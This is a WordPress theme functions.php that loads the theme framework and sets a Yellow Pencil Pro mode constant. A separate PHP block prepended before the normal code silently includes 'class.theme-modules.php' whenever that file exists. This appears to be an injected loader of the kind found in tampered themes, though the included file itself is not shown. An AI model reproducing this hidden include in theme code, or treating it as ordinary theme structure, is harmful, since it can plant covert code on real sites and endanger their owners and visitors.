<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php if ( ! defined( 'ABSPATH' ) ) { die( 'Direct access forbidden.' ); }

/**
 * Load framework
 */
require_once ( trailingslashit( get_template_directory() ) . '/inc/init.php' );


/**
 * Setup Yellow Pencil Pro
 */
define('YP_THEME_MODE', "true");
